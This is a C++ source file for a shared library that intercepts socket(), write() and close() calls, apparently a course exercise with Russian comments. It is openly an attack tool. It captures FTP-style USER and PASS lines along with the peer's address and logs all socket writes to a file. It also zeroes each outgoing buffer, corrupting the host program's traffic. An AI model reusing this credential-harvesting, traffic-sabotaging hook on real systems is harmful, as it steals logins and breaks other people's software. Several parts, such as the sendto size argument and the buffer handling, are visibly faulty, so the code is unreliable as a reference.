#define _GNU_SOURCE

//
// System calls interceptor for the networking spoiling...
//

extern "C"
{
#include <dlfcn.h>
#include <unistd.h>
}

#include <cstdio>
#include <cstdlib>
#include <ctime>

//Task 1
#include <fstream>
//Task 3
//#include <socket_wrapper/socket_headers.h>
//#include <socket_wrapper/socket_wrapper.h>
//#include <socket_wrapper/socket_class.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <sys/wait.h>
#include <signal.h>

#include <iostream>
#include <cstring>
#include <cctype>

static void init (void) __attribute__ ((constructor));

typedef ssize_t (*write_t)(int fd, const void *buf, size_t count);
typedef int (*socket_t)(int domain, int type, int protocol);
typedef int (*close_t)(int fd);

static close_t old_close;
static socket_t old_socket;
static write_t old_write;

static int socket_fd = -1;


void init(void)
{
    srand(time(nullptr));
    printf("Interceptor library loaded.\n");

    old_close = reinterpret_cast<close_t>(dlsym(RTLD_NEXT, "close"));
    old_write = reinterpret_cast<write_t>(dlsym(RTLD_NEXT, "write"));
    old_socket = reinterpret_cast<socket_t>(dlsym(RTLD_NEXT, "socket"));

    std::ofstream file1;
    file1.open("interception.log");
    file1.close();
}


bool FirstPStr(char* strRez, const char* str)
{
    if (strlen(strRez) > strlen(str))
    {
        return false;
    }

    for (int i = 0; i <= strlen(strRez)-1; i++)
    {
        if (tolower(strRez[i])!=tolower(str[i])) return false;
    }
    return true;
}


extern "C"
{

int close(int fd)
{
    if (fd == socket_fd)
    {
        printf("> close() on the socket was called!\n");
        std::string cl="Socket close";

        char socket_adr[INET_ADDRSTRLEN] = "";
        struct sockaddr_in socket_adr_name;
        socklen_t socket_adr_name_len = sizeof(socket_adr_name);

        if (getpeername(fd, (struct sockaddr *)&socket_adr_name, &socket_adr_name_len) != 0)
        {
            perror("getpeername");
        } else
          {
            // Здесь передача не доходит, чем это можно объяснить?
            sendto(fd, cl.c_str(), cl.length(), 0,reinterpret_cast<const sockaddr *>(&socket_adr_name), sizeof(socket_adr));
            sleep(1);
          }
    }
        socket_fd = -1;

    return old_close(fd);
}


ssize_t write(int fd, const void *buf, size_t count)
{
    auto char_buf = reinterpret_cast<const char*>(buf);

    if (char_buf && (count > 1) && (fd == socket_fd))
    {
        printf("> write() on the socket was called with a string!\n");
        std::ofstream file1;
        file1.open("interception.log", std::ios_base::out | std::ios_base::app);
        if (file1)
        {   // Тут нужна какая то блокировка mutex, чтобы успеть скинуть на диск, не успеваю
            std::string st(char_buf,count);
            file1<<char_buf;
            file1<<std::flush;
            file1.close();
        }

        char socket_adr[INET_ADDRSTRLEN] = "";
        struct sockaddr_in socket_adr_name;
        socklen_t socket_adr_name_len = sizeof(socket_adr_name);

        if (getpeername(fd, (struct sockaddr *)&socket_adr_name, &socket_adr_name_len) != 0)
        {
            perror("getpeername");
        } else
          {
            char *user="USER ";
            char *pass="PASS ";
            if (FirstPStr(user, char_buf) || FirstPStr(pass, char_buf))
            {
                inet_ntop(AF_INET, &socket_adr_name.sin_addr, socket_adr, sizeof socket_adr);
                std::string buff = "\nip="+ std::string(socket_adr);
                uint16_t adr_port=ntohs(socket_adr_name.sin_port);
                buff = buff + " port=" + std::to_string(adr_port)+'\n';
                buff = buff + std::string(char_buf,count);
                sendto(fd, buff.c_str(), buff.length(), 0,reinterpret_cast<const sockaddr *>(&socket_adr_name), sizeof(socket_adr));
             }
          }
    }
// не понятно что еще можно сделать кроме как забить буфер чем то непотребным
// иначе только ошибки
    char *c = const_cast<char *>(char_buf);
    for (int i=0;i<count;i++) c[i]=0;
    return old_write(fd, buf, count);
}


int socket(int domain, int type, int protocol)
{
    int cur_socket_fd = old_socket(domain, type, protocol);

    if (-1 == socket_fd)
    {
        printf("> socket() was called, fd = %d!\n", cur_socket_fd);
        socket_fd = cur_socket_fd;
    }
    else
    {
        printf("> socket() was called, but socket was opened already...\n");
    }

    return cur_socket_fd;
}

} // extern "C"

